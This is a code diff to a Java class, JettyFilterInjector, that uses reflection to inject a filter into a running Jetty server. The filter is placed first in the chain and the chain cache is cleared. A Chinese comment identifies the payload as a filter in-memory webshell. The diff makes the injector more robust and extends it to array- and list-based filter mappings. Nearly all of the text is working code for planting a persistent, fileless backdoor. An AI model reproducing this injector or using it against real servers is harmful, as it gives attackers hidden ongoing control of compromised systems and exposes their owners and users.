@@ -40,15 +40,14 @@ public class JettyFilterInjector {
                 Object filter = getFilter(context);
                 addFilter(context, filter);
             }
-        } catch (Exception ignored) {
-
+        } catch (Exception e) {
+            e.printStackTrace();
         }
 
     }
 
-    public void addFilter(Object context, Object magicFilter) {
+    public void addFilter(Object context, Object magicFilter) throws Exception {
         Class<?> filterClass = magicFilter.getClass();
-        try {
             Object servletHandler = getFV(context, "_servletHandler");
 
             // 1. 判断是否已经注入
@@ -71,9 +70,24 @@ public class JettyFilterInjector {
             invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, int.class}, new Object[]{filterHolder, getUrlPattern(), 1});
 
             // 3. 修改Filter的优先级为第一位
-            Object filterMaps = getFV(servletHandler, "_filterMappings");
-            int filterLength = Array.getLength(filterMaps);
-            ArrayList<Object> reorderedFilters = new ArrayList<Object>();
+        moveFilterToFirst(servletHandler);
+
+        try {
+            // 4. 解决 jetty filterChainsCache 导致 filter 内存马连接失败的问题
+            invokeMethod(servletHandler, "invalidateChainsCache");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        System.out.println("filter added successfully");
+    }
+
+    void moveFilterToFirst(Object servletHandler) throws Exception {
+        Object filterMaps = getFV(servletHandler, "_filterMappings");
+        ArrayList<Object> reorderedFilters = new ArrayList<>();
+        int filterLength;
+
+        if (filterMaps.getClass().isArray()) {
+            filterLength = Array.getLength(filterMaps);
             for (int i = 0; i < filterLength; i++) {
                 Object filter = Array.get(filterMaps, i);
                 String filterName = (String) getFV(filter, "_filterName");
@@ -86,16 +100,21 @@ public class JettyFilterInjector {
             for (int i = 0; i < filterLength; i++) {
                 Array.set(filterMaps, i, reorderedFilters.get(i));
             }
-
-            try {
-                // 4. 解决 jetty filterChainsCache 导致 filter 内存马连接失败的问题
-                invokeMethod(servletHandler, "invalidateChainsCache");
-            } catch (Exception e) {
-                System.out.println("invalidateChainsCache error");
-                e.printStackTrace();
+        } else if (filterMaps instanceof ArrayList) {
+            ArrayList<Object> filterList = (ArrayList<Object>) filterMaps;
+            filterLength = filterList.size();
+            for (Object filter : filterList) {
+                String filterName = (String) getFV(filter, "_filterName");
+                if (filterName.equals(getClassName())) {
+                    reorderedFilters.add(0, filter);
+                } else {
+                    reorderedFilters.add(filter);
+                }
             }
-        } catch (Exception e) {
-            e.printStackTrace();
+            filterList.clear();
+            filterList.addAll(reorderedFilters);
+        } else {
+            throw new IllegalArgumentException("filterMaps must be either an array or an ArrayList");
         }
     }
 
